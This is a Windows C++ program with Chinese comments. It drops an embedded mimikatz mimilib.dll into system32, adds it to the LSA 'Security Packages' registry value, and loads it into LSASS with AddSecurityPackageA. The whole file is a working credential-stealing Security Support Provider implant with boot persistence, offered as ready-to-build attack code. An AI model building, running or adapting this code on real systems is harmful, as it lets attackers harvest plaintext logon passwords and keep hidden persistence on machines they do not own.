#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include<Windows.h>
#include<stdio.h>
#include <ntsecapi.h>
#include <iostream>
#include <string.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include "resource1.h"

#pragma comment(lib, "Secur32.lib")
using namespace std;

BOOL ReleaseLibrary(UINT uResourceId, CHAR* szResourceType, CHAR* szFileName) {
	//找到资源并获取资源大小
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(uResourceId), szResourceType);
	DWORD dwSize = SizeofResource(NULL, hRsrc);
	//载入资源
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	//载入资源，并返回指向资源的第一个指针
	LPVOID lpRes = LockResource(hGlobal);

	HANDLE hFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWriten = 0;
	BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);

	CloseHandle(hFile);
	CloseHandle(hGlobal);
	CloseHandle(hRsrc);
	return TRUE;
}

int main() {

	BOOL bRes = ReleaseLibrary(IDR_MIMILIB2, (CHAR*)"MIMILIB", (CHAR*)"mimilib.dll");
	
	if (bRes == FALSE) {
		printf("[+] Release Dll Error !\n");
	}

	string wszStr = "copy mimilib.dll %systemroot%\\system32\\mimilib.dll";
	system(wszStr.c_str());
	
	HKEY hKey = NULL;
	DWORD dwType = 0;
	TCHAR szKeyName[] = "System\\CurrentControlSet\\Control\\Lsa";
	long flag = RegCreateKeyEx(
		HKEY_LOCAL_MACHINE,
		szKeyName,
		0,
		(LPSTR)dwType,
		REG_OPTION_NON_VOLATILE,
		KEY_SET_VALUE,
		NULL,
		&hKey,
		NULL
		);

	TCHAR szName[] = TEXT("Security Packages");
	TCHAR szValue[] = TEXT("kerberos\0\msv1_0\0schannel\0wdigest\0tspkg\0mimilib\0");
	RegSetValueEx(
		hKey,
		szName,
		0,
		REG_MULTI_SZ,
		(LPBYTE)szValue,
		sizeof(szValue)
	);
	RegCloseKey(hKey);

	SECURITY_PACKAGE_OPTIONS option;
	option.Size = sizeof(option);
	option.Flags = 0;
	option.Type = SECPKG_OPTIONS_TYPE_LSA;
	option.SignatureSize = 0;
	option.Signature = NULL;
	SECURITY_STATUS SEC_ENTRYmRet = AddSecurityPackageA((LPSTR)"mimilib",&option);
	
	return TRUE;
}
